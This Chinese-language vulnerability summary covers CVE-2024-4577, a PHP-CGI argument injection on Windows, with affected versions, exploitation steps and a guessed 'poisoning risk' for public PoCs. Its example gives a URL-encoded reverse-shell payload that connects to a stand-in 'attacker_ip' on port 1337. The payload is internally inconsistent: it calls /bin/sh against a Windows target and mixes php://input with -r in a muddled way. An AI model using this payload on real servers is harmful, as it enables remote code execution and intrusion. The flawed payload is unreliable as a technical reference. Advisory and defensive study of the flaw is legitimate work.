## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，系统使用特定的代码页（Best-Fit），且使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI中的OS命令注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上运行任意PHP代码。

**有效性：**
从提供的漏洞库信息和搜索结果来看，该漏洞已被广泛利用，并且有公开的PoC代码。Akamai等机构已观察到实际利用案例。因此，认为该漏洞的PoC是有效的。

**投毒风险：**
提供的代码片段是漏洞信息的JSON格式，不包含任何可执行代码。因此，直接从这个JSON文件判断投毒风险是不可能的。需要分析具体的利用代码才能判断。考虑到Github上存在大量的POC, 假设攻击者在代码中添加了恶意代码，如反弹shell或下载执行恶意文件等，有一定的投毒可能性，估算投毒风险为10%。

**利用方式：**
利用方式主要包括以下步骤：
1.  **确定目标：** 找到运行在Windows上，且以CGI模式运行的PHP服务器，版本在受影响范围内 (PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8)。需要特别注意的是，apache服务器是必要条件之一
2.  **构造恶意请求：** 构造包含恶意PHP选项的HTTP请求。利用Windows的“Best-Fit”字符转换，将特殊字符转换为PHP选项，例如`-d`选项可以用来设置PHP配置项，`-r`选项可以直接执行PHP代码。
3.  **执行任意代码：** 通过`-d`或`-r`选项，执行任意PHP代码，例如执行`system()`函数来执行系统命令，或者写入webshell文件到服务器。

**示例：**
`?%AA-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input -r+%24sock%3dfsockopen(%22attacker_ip%22%2c1337)%3bwhile(%21feof(%24sock))%7b%24data.%3dfread(%24sock%2c1024)%3b%7d%24shell%3dshell_exec(%22/bin/sh+-i%22)%3bfwrite(%24sock%2c%24shell)%3b`

此示例中， `%AA` 被转换为 `-` ，然后使用`-d` 和 `-r`执行任意代码，建立反弹shell连接到攻击者的IP地址和端口。

**项目地址:** [Entropt/CVE-2024-4577_Analysis](https://github.com/Entropt/CVE-2024-4577_Analysis)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)